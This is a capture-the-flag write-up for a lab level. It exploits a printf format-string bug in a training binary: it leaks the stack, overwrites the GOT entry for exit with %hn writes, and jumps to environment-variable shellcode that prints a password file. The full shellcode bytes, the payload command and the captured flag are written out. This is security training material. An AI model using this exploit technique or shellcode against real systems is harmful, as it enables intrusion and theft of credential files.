# level05

This program converts the input buffer read from stdin to lowercase, and passes it directly into `printf` function as format string.

## Step 1. Find format string itself in stack
```
level05@OverRide:~$ perl -le 'print "aaaa_", "%08x "x12' | ./level05
aaaa_00000064 f7fcfac0 f7ec3af9 ffffd6df ffffd6de 00000000 ffffffff ffffd764 f7fdb000 61616161 3830255f 30252078
```
We used `%08x` pattern to find out the location of format string in stack. `61616161` is the beginning of the string. Our format string locates at 10th position.

## Step 2. Locate `exit` function in `.got` section
```
level05@OverRide:~$ objdump -R level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
```
Our plan is to overwrite the address of `exit` function in the `.got` section.

## Step 3. GOT overwrite
```
level05@OverRide:~$ export SHELLCODE=`perl -e 'print "\x90"x100, "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"'`
level05@OverRide:~$ /tmp/getenv
0xffffd845
level05@OverRide:~$ perl -e 'print pack("V", 0x080497e0), pack("V", 0x080497e2), "%55357u%10\$hn", "%10170u%11\$hn"' | ./level05
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
Since the address of our shellcode is too big, we overwrite the target 2 bytes each time. First 2 bytes we input the data `0xd845 - 0x8(8 bytes address we've already printed) = 0xd83d(55357)`, then we overwrite the next 2 bytes `0xffff - 0xd845 = 0x27ba`.
